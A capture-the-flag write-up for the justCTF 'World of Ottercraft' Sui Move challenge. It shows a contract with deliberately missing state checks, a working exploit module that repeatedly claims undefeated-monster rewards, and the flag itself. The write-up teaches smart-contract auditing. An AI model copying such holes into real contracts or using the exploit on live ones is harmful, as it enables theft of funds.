# World of Ottercraft 

## Description
```
Welcome to the World of Ottercraft, where otters rule the blockchain! In this challenge, you'll dive deep into the blockchain to grab the mythical Otter Stone! Beware of the powerful monsters that will try to block your path! Can you outsmart them and fish out the Otter Stone, or will you just end up swimming in circles?

- nc woo.nc.jctf.pro 31337
```

## Provided Files
```
- woo_docker.tar.gz
```

## Writeup

> [!NOTE]
> Writeup by [kdm](https://github.com/FRoith)
> Credit to [Philogic](https://github.com/PhilippSchweinzer) who helped me out on this one.

This challenge is the next one in the Blockchain series, and since I already explained some things about the framework in "The Otter Scrolls", I will get straight into the challenge here.

```rust
module challenge::Otter {

    // ---------------------------------------------------
    // DEPENDENCIES
    // ---------------------------------------------------

    use sui::coin::{Self, Coin};
    use sui::balance::{Self, Balance, Supply};
    use sui::table::{Self, Table};
    use sui::url;

    // ---------------------------------------------------
    // CONST
    // ---------------------------------------------------

    // STATUSES
    const PREPARE_FOR_TROUBLE: u64 = 1;
    const ON_ADVENTURE: u64 = 2;
    const RESTING: u64 = 3;
    const SHOPPING: u64 = 4;
    const FINISHED: u64 = 5;

    // ERROR CODES
    const WRONG_AMOUNT: u64 = 1337;
    const BETTER_GET_EQUIPPED: u64 = 1338;
    const WRONG_PLAYER_STATE: u64 = 1339;
    const ALREADY_REGISTERED: u64 = 1340;
    const TOO_MANY_MONSTERS: u64 = 1341;
    const BUY_SOMETHING: u64 = 1342;
    const NO_SUCH_PLAYER: u64 = 1343;
    const NOT_SOLVED: u64 = 1344;

    // LIMITS
    const QUEST_LIMIT: u64 = 25;

    // ---------------------------------------------------
    // STRUCTS
    // ---------------------------------------------------

    public struct OTTER has drop {}

    public struct OsecSuply<phantom CoinType> has key {
        id: UID,
        supply: Supply<CoinType>
    }

    public struct Vault<phantom CoinType> has key {
        id: UID,
        cash: Coin<CoinType>
    }

    public struct Monster has store {
        reward: u64,
        power: u64
    }

    public struct QuestBoard has key, store {
        id: UID,
        quests: vector<Monster>,
        players: Table<address, bool> //<player_address, win_status>
    }

    public struct Player has key, store {
        id: UID,
        user: address,
        power: u64,
        status: u64,
        quest_index: u64,
        wallet: Balance<OTTER>
    }

    public struct TawernTicket {
        total: u64,
        flag_bought: bool
    }

    // ---------------------------------------------------
    // MINT CASH
    // ---------------------------------------------------

    fun init(witness: OTTER, ctx: &mut TxContext) {
        let (mut treasury, metadata) = coin::create_currency(witness, 9, b"OSEC", b"Osec", b"Otter ca$h", option::some(url::new_unsafe_from_bytes(b"https://osec.io/")), ctx);
        transfer::public_freeze_object(metadata);

        let pool_liquidity = coin::mint<OTTER>(&mut treasury, 50000, ctx);

        let vault = Vault<OTTER> {
            id: object::new(ctx),
            cash: pool_liquidity
        };

        let supply = coin::treasury_into_supply(treasury);

        let osec_supply = OsecSuply {
            id: object::new(ctx),
            supply
        };

        transfer::transfer(osec_supply, tx_context::sender(ctx));

        transfer::share_object(QuestBoard {
            id: object::new(ctx),
            quests: vector::empty(),
            players: table::new(ctx)
        });

        transfer::share_object(vault);
    }

    public fun mint(sup: &mut OsecSuply<OTTER>, amount: u64, ctx: &mut TxContext): Coin<OTTER> {
        let osecBalance = balance::increase_supply(&mut sup.supply, amount);
        coin::from_balance(osecBalance, ctx)
    }

    public entry fun mint_to(sup: &mut OsecSuply<OTTER>, amount: u64, to: address, ctx: &mut TxContext) {
        let osec = mint(sup, amount, ctx);
        transfer::public_transfer(osec, to);
    }

    public fun burn(sup: &mut OsecSuply<OTTER>, c: Coin<OTTER>): u64 {
        balance::decrease_supply(&mut sup.supply, coin::into_balance(c))
    }

    // ---------------------------------------------------
    // REGISTER - ADMIN FUNCTION
    // ---------------------------------------------------

    public fun register(_: &mut OsecSuply<OTTER>, board: &mut QuestBoard, vault: &mut Vault<OTTER>, player: address, ctx: &mut TxContext) {
        assert!(!table::contains(&board.players, player), ALREADY_REGISTERED);

        let new_cash = coin::into_balance(coin::split(&mut vault.cash, 250, ctx));

        let new_player_obj = Player {
            id: object::new(ctx),
            user: player,
            power: 10,
            status: RESTING,
            quest_index: 0,
            wallet: new_cash
        };

        table::add(&mut board.players, player, false);

        transfer::transfer(new_player_obj, player);
    }

    public fun check_winner(board: &QuestBoard, player: address) {
        assert!(table::contains(&board.players, player), NO_SUCH_PLAYER);
        assert!(table::borrow(&board.players, player) == true, NOT_SOLVED);
    }

    // ---------------------------------------------------
    // TAVERN
    // ---------------------------------------------------

    public fun enter_tavern(player: &mut Player): TawernTicket {
        assert!(player.status == RESTING, WRONG_PLAYER_STATE);

        player.status = SHOPPING;

        TawernTicket{ total: 0, flag_bought: false }
    }

    public fun buy_flag(ticket: &mut TawernTicket, player: &mut Player) {
        assert!(player.status == SHOPPING, WRONG_PLAYER_STATE);

        ticket.total = ticket.total + 537;
        ticket.flag_bought = true;
    }

    public fun buy_sword(player: &mut Player, ticket: &mut TawernTicket) {
        assert!(player.status == SHOPPING, WRONG_PLAYER_STATE);

        player.power = player.power + 213;
        ticket.total = ticket.total + 140;
    }

    public fun buy_shield(player: &mut Player, ticket: &mut TawernTicket) {
        assert!(player.status == SHOPPING, WRONG_PLAYER_STATE);

        player.power = player.power + 7;
        ticket.total = ticket.total + 20;
    }

    public fun buy_power_of_friendship(player: &mut Player, ticket: &mut TawernTicket) {
        assert!(player.status == SHOPPING, WRONG_PLAYER_STATE);

        player.power = player.power + 9000; //it's over 9000!
        ticket.total = ticket.total + 190;
    }

    public fun checkout(ticket: TawernTicket, player: &mut Player, ctx: &mut TxContext, vault: &mut Vault<OTTER>, board: &mut QuestBoard) {
        let TawernTicket{ total, flag_bought } = ticket;

        assert!(total > 0, BUY_SOMETHING);  
        assert!(balance::value<OTTER>(&player.wallet) >= total, WRONG_AMOUNT);

        let balance = balance::split(&mut player.wallet, total);
        let coins = coin::from_balance(balance, ctx);

        coin::join(&mut vault.cash, coins);

        if (flag_bought == true) {

            let flag = table::borrow_mut(&mut board.players, tx_context::sender(ctx));
            *flag = true;

            std::debug::print(&std::string::utf8(b"$$$$$$$$$$$$$$$$$$$$$$$$$ FLAG BOUGHT $$$$$$$$$$$$$$$$$$$$$$$$$")); //debug
        };

        player.status = RESTING;
    }

    // ---------------------------------------------------
    // ADVENTURE TIME
    // ---------------------------------------------------

    public fun find_a_monster(board: &mut QuestBoard, player: &mut Player) {
        assert!(player.status != SHOPPING && player.status != FINISHED && player.status != ON_ADVENTURE, WRONG_PLAYER_STATE);
        assert!(vector::length(&board.quests) <= QUEST_LIMIT, TOO_MANY_MONSTERS);

        let quest = if (vector::length(&board.quests) % 3 == 0) {
            Monster {
                reward: 100,
                power: 73
            }
        } else if (vector::length(&board.quests) % 3 == 1) {
            Monster {
                reward: 62,
                power: 81
            }
        } else {
            Monster {
                reward: 79,
                power: 94
            }
        };

        vector::push_back(&mut board.quests, quest);
        player.status = PREPARE_FOR_TROUBLE;
    }
    
    public fun bring_it_on(board: &mut QuestBoard, player: &mut Player, quest_id: u64) {
        assert!(player.status != SHOPPING && player.status != FINISHED && player.status != RESTING && player.status != ON_ADVENTURE, WRONG_PLAYER_STATE);

        let monster = vector::borrow_mut(&mut board.quests, quest_id);
        assert!(player.power > monster.power, BETTER_GET_EQUIPPED);

        player.status = ON_ADVENTURE;

        player.power = 10; //equipment breaks after fighting the monster, and friends go to party :c
        monster.power = 0; //you win! wow!
        player.quest_index = quest_id;
    }

    public fun return_home(board: &mut QuestBoard, player: &mut Player) {
        assert!(player.status != SHOPPING && player.status != FINISHED && player.status != RESTING && player.status != PREPARE_FOR_TROUBLE, WRONG_PLAYER_STATE);

        let quest_to_finish = vector::borrow(&board.quests, player.quest_index);
        assert!(quest_to_finish.power == 0, WRONG_AMOUNT);

        player.status = FINISHED;
    }

    public fun get_the_reward(vault: &mut Vault<OTTER>, board: &mut QuestBoard, player: &mut Player, ctx: &mut TxContext) {
        assert!(player.status != RESTING && player.status != PREPARE_FOR_TROUBLE && player.status != ON_ADVENTURE, WRONG_PLAYER_STATE);

        let monster = vector::remove(&mut board.quests, player.quest_index);

        let Monster {
            reward: reward,
            power: _
        } = monster;

        let coins = coin::split(&mut vault.cash, reward, ctx); 
        let balance = coin::into_balance(coins);

        balance::join(&mut player.wallet, balance);

        player.status = RESTING;
    }

}
```

Now this one has a lot more going on than the previous one, but let's take a look at the provided solve interface too:
```rust
module solve::solve {

    // [*] Import dependencies
    use challenge::Otter::{Self, OTTER};

    public fun solve(
        _board: &mut Otter::QuestBoard,
        _vault: &mut Otter::Vault<OTTER>,
        _player: &mut Otter::Player,
        _ctx: &mut TxContext
    ) {
        // Your code here...
    }

}
```

Alright so: We have a quest board, a vault, a player and a context, and there are a lot of different functions we can call.

noteably:
- `enter_tavern` if we have a `player` whose `status` is `RESTING`, which gives us a `TawernTicket` and sets `player.status` to `SHOPPING`
- `buy_flag` if we have `player.status` is `SHOPPING` and we have a `TawernTicket`, and adds 537 to `ticket.value`
- `buy_sword`, `buy_shield` and `buy_power_of_friendship`, just like `buy_flag`, and they add 140, 20 and 190 to `ticket.total`, as well as 213, 7 and 9000 to `player.power`
- `checkout`, needs `vault`, `player`, `context`, `quest_board` and a `TawernTicket`, and all the conditions that need to me met are: `0 < ticket.total <= player.wallet`, and it sets `player.status` to `RESTING`, and marks the flag as purchased, which would complete the challenge, if the `buy_flag` function was called
- `find_a_monster`, which can only be called if `player.status` is not `SHOPPING`, `FINISHED`, `RESTING` or `ON_ADVENTURE`, which adds a monster to the `quest_board` with a power and reward, as well as setting `player.status` to `PREPARE_FOR_TROUBLE`
- `bring_it_on`, which can only be done if `player.status` is not `SHOPPING`, `FINISHED`, `RESTING`, or `ON_ADVENTURE`, which fights the monster at the provided quest index can only succeed if `player.power > monster.power` and sets `player.status` to `ON_ADVENTURE`, as well as `monster.power` to 0 and `player.power` back down to its standard value 10
- `return_home` which requires that `player.status` is not `SHOPPING`, `FINISHED`, `RESTING` or `PREPARE_FOR_TROUBLE` and sets `player.status` to `FINISHED` and sets `quest_to_finish` to the index of the monster that was fought
- `get_the_reward`, which can only be done if `player.status` is not `RESTING`, `PREPARE_FOR_TROUBLE` or `ON_ADVENTURE`, and increases `player.wallet` by the reward of the monster at index `quest_to_finish`, and then removes the monster from the list

Now, one would expect the normal gameplay loop to be: Visit the tavern, buy equipment, checkout, add a monster to the questboard, defeat the monster, return home and get the reward.

This would only work once though, since the players power gets reset after every fight, so equipment is consumeable, but unfortunately, the equipment required to defeat a monster is more expensive than the reward the monster gives.

So instead we have to do a little sequence breaking, and we will abuse the fact that the player state is not always checked correctly.

Our only way of generating money, is getting the reward, which doesn't actually check if a monster has been defeated or not, and just gets the top monster from the quest board, and pays out. And even better, we can totally call this function when the player is in a state other than `FINISHED`, namely `SHOPPING`.

So our plan now: get equipped, generate a bunch of monsters for our quest board, defeat one, get the reward, go shopping and get the reward again until there are no monsters left on the board, which should lead to enough money to be able to afford the flag.

There is just a small roadblock: the generated tickets must always be consumed by the `checkout` function, otherwise the transaction is illegal. Luckily, we can always call `checkout` from any state, and so we can make sure to buy a cheap shield while we are shopping, and still make big profits.

Coding all of this out results in this here:
```rust
module solve::solve {

    // [*] Import dependencies
    use challenge::Otter::{Self, OTTER};

    public fun solve(
        _board: &mut Otter::QuestBoard,
        _vault: &mut Otter::Vault<OTTER>,
        _player: &mut Otter::Player,
        _ctx: &mut TxContext
    ) {
        let mut friendship_ticket = Otter::enter_tavern(_player);
        Otter::buy_power_of_friendship(_player, &mut friendship_ticket);
        Otter::checkout(friendship_ticket, _player, _ctx, _vault, _board);
        let mut i = 0;
		while (i < 9) {
			Otter::find_a_monster(_board, _player);
			i = i + 1;
		};
		Otter::bring_it_on(_board, _player, 0);
		Otter::return_home(_board, _player);
		Otter::get_the_reward(_vault, _board, _player, _ctx);
		
		i = 0;
		while (i < 8) {
			let mut ticket = Otter::enter_tavern(_player);
			Otter::buy_shield(_player, &mut ticket);
	        Otter::get_the_reward(_vault, _board, _player, _ctx);
			Otter::checkout(ticket, _player, _ctx, _vault, _board);
			i = i + 1;
		};
		
        let mut flag_ticket = Otter::enter_tavern(_player);
        Otter::buy_flag(&mut flag_ticket, _player);
        Otter::checkout(flag_ticket, _player, _ctx, _vault, _board);
    }

}
```

Which gets us the flag: 
`justCTF{Ott3r_uses_expl0it_its_sup3r_eff3ctiv3}`
